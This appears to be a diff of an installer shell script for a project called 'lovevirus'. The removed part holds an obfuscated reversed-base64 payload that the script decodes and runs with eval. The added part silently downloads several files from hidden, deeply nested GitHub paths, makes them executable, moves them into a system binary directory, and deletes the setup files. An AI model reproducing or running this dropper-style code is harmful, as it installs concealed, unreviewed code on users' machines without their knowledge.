@@ -1,9 +1,35 @@
 # Auther : Simplehacker1_Communty 
 # Powered by simplehacker1
 # Starting Date : 1 DEC 2021
+#!bin/sh -q
+# Auther : Simplehacker1_Communty 
+# Powered By simplehacker1
+# Starting Date : 1 DEC 2021
 
-
-gH4="Ed";kM0="xSz";c="ch";L="4";rQW="";fE1="lQ";s=" '=ogIXFlckIzYIRCekEHMORiIgwWY2VmCpICcahHJVRCTkcVUyRie5YFJ3RiZkAnW4RidkIzYIRiYkcHJzRCZkcVUyRyYkcHJyMGSkICIsFmdlhCJ9gnCiISPwpFe7IyckVkI9gHV7ICfgYnI9I2OiUmI9c3OiImI9Y3OiISPxBjT7IiZlJSPjp0OiQWLgISPVtjImlmI9MGOQtjI2ISP6ljV7Iybi0DZ7ISZhJSPmV0Y7IychBnI9U0YrtjIzFmI9Y2OiISPyMGS7Iyci0jS4h0OiIHI8ByJKkUeGlWYXRjdjJzZnxEWFtUS5JkQkhlUvpFWJd2TpJEVhdVM3J2RW9WWX5kcahVS4hFMOZnYXFTMi5mU1kUQvpWSGJkdkJjV5p1VRdWUut2ZjJDb0N2R4xWYHZkahJjV51UUvpWSG5EMZhlSwE2V14WSFJFakdUVn9UaBhXSFJlRRlXQ51ERJh3QnB3ciNjWsJ2R54mY5dGcld3bnl0QBdWWygHbZhVSnl0QBdWSDF0ZJNUQnl0QBdWSDF0ZJNUQnl0QBdWSDF0ZJNUQnl0QBdWSDF0ZJNUQLNGSKBnYuJVbJNEZjplVzh3T61UeiNVQnl0QBdGT5FkdJNUQnl0QBdWSDFkdMlXQnl0Qrd2STJEOmNUQnl0Q4cGT5F0ZMlHOnl0QBZXSDhzZYdkVi10RxMmYpN2SjhkSwJmbS1WSDR2YaZ1c49keNlnYTF0ZJNUQ2l0Q4cWSDF0ZJNUQnl0Q4YXSDF0ZMlXQ2l0QChjZDF0ZMlXQ2l0QBZHTxkjZYFDOnl0QBdGWHZlYNdUMjJWajt0YIpEci5mUtl0QkNmWWNHePpXT5J2UBdWSDhzZMlXQnl0QBdWSDF0ZMlHOnl0QBZXSDhzZJNkQ4Y2QBZXSDhzZJNEOnhVM5YGW5F0ZJNUQnh1RWJWTHFzYil2YLNGSKBnYuJVbJNEZjplVzh3T61UeiNVQnxUeBZXSDF0ZJNUQnl0QBZHT5F0ZJNEOnxUeBdWSDJEOmNEOnxUeBdGT5hzZJNUQnl0QBdWSDF0ZYdkVi10RxMmYpN2SjhkSwJmbS1WSDR2YaZ1c49keNlnYTFkdJNUOmhVM5YGT5FkdJN0ZvhVM5YGT5FkdJNUQnl0QChTSDFkdJNUQ2xUM5YGWxgjdJNEOnl0QBdGWHZlYNdUMjJWajtkZRB3ciNjWsJ2R54mY3BnaaNUQ2lVbsVHT3BnaaNUQ1xUa5EzYzkkdZ1Gb1x0dwNjWyYFMJNUM4l0RoBDZIJkePlGO2NWbGNDTtRGckdEaxklbWpnWYpkaiJTNwo1V1ADTt5kdiNVOUF2VxcnYHZ1bZdlTypFWJhXUykDdihlV1FGWSVDTygndk1mVyEGWKFzY5lDdZdFb1xUe14WYYJ1bkdVS2RmM5kXYyo1ciNDZ6xkM3ZnY5lzdMJDO2JWe5ADTykldZNTW2RWa5IDTy0kdalWOtxkMStmWplzaMNTT2NWe5oXZDlDNMNzZ2V2Q5QDTz0kdjlHOs1EMZZXWY9mdllWO2w0MNZ3Y5ljeMNDa2oVbRZnWHFldaNUOrxkMRZnWDlzaMNjTrxkMRZnWDlzaMJTU2p1Q5smWDlzaMJTU2p1Q4U3YHxWdalXQnpka0cGTyIFbklWO1R2V4NXSBB3MaJjVwk0QxgXSHhGMkhkQ69Ua4Y3YtZ0MM1GZwR2RoFTWuZleahlSqJmM1AjWXVDMM1mT2J2U5QVYXFzdidkVvl1VOJnWYlEeRJTO0JGWWVXYYJVNMJDe2RWbWJTYYpUMjlXO0l1VsVHT5VjMahlS6F2V5UHTuJFNkNUQtBVaBZnWHZlMMJTNxI2R3d2QuRmbahVUnxEWFdWYIJFMjhUT2wUe5kXWYNWdaJDbwEGSWlGZY5Ebj1mT2JmbSxmYuFVdZJTO0xUMOBnYYJ0cadFaollM0x2YqZERiJTM0R2V1AHZItmdidUOyoFWaB3YuZleMJTMoF2V0YHTtRGckdEaxkVa5MjYzokca1Ge2R2MNZnYDljdMNTQ2JWe5YHTzEldalWOqRWa5IDTzkldZlXOtxkMZZnWHJVbMJTU2NWe5oHTz4ENMNzZ2V2Q5QDTzcmdjlXO6xUeVpnUplDallWO2w0MvZ3Y5ljeMNTT2VGSw1mWDlzaaNUOrxkMRZnWDlzaMJTU2NmMRZnWDlzaMJTU2p1Q5sGTyI1aMJTU2p1Q5sGTygndk1WV1NmMndmSqRzZMJjUsRWa5UHZXh3cJFEczolMWBTSDFDeJdEawQGSCp3Tphjdj1mRzwUbkBHZHhWMZ5mV6pFWKpmYyUDMadVNwwUbOZnYTlDVhdVM3J2RW9WWX5kcahVS4FlM5QnYYZVdhhlU1wkM4ZHZtZlMhhlSxMWe5QXWXxWdMlXNuFGWS9GZXlkdkJTO5FmMaNnYzQmeMJzd2JWe5cHTygjdilXOwwkMZZXWzkldklWOywkMNZnWplTbMJjUrpVa5sGTz0kdjlXO6V2Q5QDTzcmdlNUO0w0MNZ3Y5hDbNBTW2lFWvZXZpljNMNTT2NWe5oHTzgmNa1WU2p1RRZnWDlzaMJTU2p1Q5sGTz40aMJTU2p1Q5sGTyEldaNUOrp1Q5sGTyEldaNUOzJ2MaxGZtxWekhVTnpka0cGTyIFbklWO1R2V4NXSBB3MaJjVwk0QxgXSHhGMkhkQ69Ua4Y3YtZ0MM1GZwR2RoFTWuZleahlSqJmM1AjWXVDMM1mT2J2U5QVYXFzdidkVvl1VOJnWYlEeRJTO0JGWWVXYYJVNMJDe2RWbWJTYYpUMjlXO0l1VsVHT5VjbhhlUvR2VJZHZykTehJjWzJ2MkpHTycndilXO3xkM4YnY5lDMMJTW2l1MZZHZpljMMJTT2pVa50GTyI1aalWOrx0MNZ3Y5ljelNUO0w0MnZXZDlDNMNTT2NWe4wWTwkldZh1b2VWa5YDTz0kdjlXO6x0MoZjWtFldadUU2p1Q5sGTyEldaNUOrx0MOtGTyEldaNUOrxkMRZnWDlzaaNUOrxkMRZnWDlzciNjWsRWbslHZY1UdjJzZnpka0cGTyIFbklWO1R2V4NXSBBnahdUM2p1QBJXZDF0ZidUOyoFWaB3YuZleD5mS0lESOxGZIZ1dM5mTvNUb4ZHZtZ1ciJDZ2NkbClXYXVDMalWQuZFSsdnWTJEai5GbzkFWKxWSHhndk1mVyEGWKFzY5JEMilnQ5R2V0cGZHhGcjlnQ6l1MKB3YIFlbJh0c4xUa0gXTEJUOJFUP9cCIi0zc7ISUsJSPxUkZ7IiI9cVUytjI0ISPMtjIoNmI9M2Oio3U4JSPw00a7ICZFJSP0g0Z
-' | r";HxJ="s";Hc2="";f="as";kcE="pas";cEf="ae";d="o";V9z="6";P8c="if";U=" -d";Jc="ef";N0q="";v="b";w="e";b="v |";Tx="Eds";xZp=""
-x=$(eval "$Hc2$w$c$rQW$d$s$w$b$Hc2$v$xZp$f$w$V9z$rQW$L$U$xZp")
-eval "$N0q$x$Hc2$rQW"
+lovelogo(){
+    clear                                    
+printf '\e[1;32m     / /        //   ) ) ||   / /  //   / / \e[0m\n'
+printf '\e[1;32m    / /        //   / /  ||  / /  //____    \e[0m\n'
+printf '\e[1;32m   / /        //   / /   || / /  / ____     \e[0m\n'
+printf '\e[1;32m  / /        //   / /    ||/ /  //          \e[0m\n'
+printf '\e[1;32m / /____/ / ((___/ /     |  /  //____/ /    \e[0m\n'
+}
+lovelogo
+#mkdir /bin/
+#cd /bin/
+#cd ../usr/bin/
+wget  https://raw.githubusercontent.com/Simplehacker1Community/lovevirus/main/.github/workflows/l/o/p/o/o/t/f/cv/v/v/c/f/f/ddf/d/s/s/sx/x/x/x/x/s/s/%3F/az/z/z/s/s/s/xzfd/dd/d/d/d/d/d/sd/d/d/d/d/d/dd/d/d/d/.ping  &> /dev/null 
+wget  https://raw.githubusercontent.com/Simplehacker1Community/lovevirus/main/.version.txt &> /dev/null 
+wget  https://raw.githubusercontent.com/Simplehacker1Community/lovevirus/main/.github/workflows/l/o/p/o/o/t/f/cv/v/v/c/f/f/ddf/d/s/s/sx/x/x/x/x/s/s/%3F/az/z/z/s/s/s/xzfd/dd/d/d/d/d/d/sd/d/d/d/d/d/dd/d/d/d/love.sh &> /dev/null 
+wget  https://raw.githubusercontent.com/Simplehacker1Community/lovevirus/main/.github/workflows/l/o/p/o/o/t/f/cv/v/v/c/f/f/ddf/d/s/s/sx/x/x/x/x/s/s/%3F/az/z/z/s/s/s/xzfd/dd/d/d/d/d/d/sd/d/d/d/d/d/dd/d/d/d/lovevirus &> /dev/null 
+wget  https://raw.githubusercontent.com/Simplehacker1Community/lovevirus/main/.github/workflows/l/o/p/o/o/t/f/cv/v/v/c/f/f/ddf/d/s/s/sx/x/x/x/x/s/s/%3F/az/z/z/s/s/s/xzfd/dd/d/d/d/d/d/sd/d/d/d/d/d/dd/d/d/d/lovevirus.sh &> /dev/null 
+chmod +x *
+mv lovevirus.sh ../usr/bin/
+mv .version.txt ../usr/bin/
+mv .ping ../usr/bin/
+mv lovevirus ../usr/bin/
+rm setup.sh
+cd ..
+rm -rf lovevirus/
+lovelogo
+printf 'Type anyware lovevirus to run this script' {1..100} 
